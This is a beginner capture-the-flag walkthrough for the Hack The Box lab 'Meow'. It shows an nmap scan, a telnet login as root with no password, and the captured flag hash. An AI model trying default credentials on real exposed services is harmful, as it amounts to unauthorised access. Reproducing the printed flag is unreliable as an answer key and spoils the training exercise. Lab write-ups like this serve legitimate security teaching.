# HTB Starting Point: Meow

## Overview

**Meow** is a beginner-friendly machine on Hack The Box (HTB) Starting Point. This walkthrough demonstrates basic enumeration and exploitation using Telnet with default credentials.

---

## Steps

### 1. Connect to the HTB VPN

First, connect to the HTB VPN to access the target machine:

Bash

```
sudo openvpn example.ovpn
```

---

### 2. Spawn the Machine

Start the Meow machine from the HTB portal and note its assigned IP address.

---

### 3. Scan the Target with Nmap

Run an Nmap scan to identify open ports and services:

Bash

```
nmap -Pn <target-ip> -oN nmap.txt
```

**Example Output:**

text

```
PORT   STATE SERVICE
23/tcp open  telnet
```

---

### 4. Connect via Telnet

The scan reveals that **Telnet (port 23)** is open. Connect using Telnet:

Bash

```
telnet <target-ip>
```

---

### 5. Login with Default Credentials

Try logging in with common/default credentials. In this case, `root` works:

text

```
Meow login: root
```

You should now have a shell on the target machine.

---

### 6. Capture the Flag

List the files in the home directory and read the flag:

Bash

```
ls
cat flag.txt
```

**Flag:**

text

```
b40abdfe23665f766f9c61ecba8a4c19
```

---

## Summary

- **Service Exploited:** Telnet (port 23)
- **Credentials Used:** root (no password)
- **Flag:** `b40abdfe23665f766f9c61ecba8a4c19`

---

## Nmap Output (Reference)

<details> <summary>Click to expand</summary>

text

```
Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-20 13:07 +0530
Nmap scan report for 10.129.107.104
Host is up (0.59s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
23/tcp open  telnet

Nmap done: 1 IP address (1 host up) scanned in 51.71 seconds
```

</details>

---

## Notes

- Always try default credentials on exposed services during initial enumeration.
- Telnet is an insecure protocol and should not be exposed to the internet.

---

**Happy Hacking!**

---
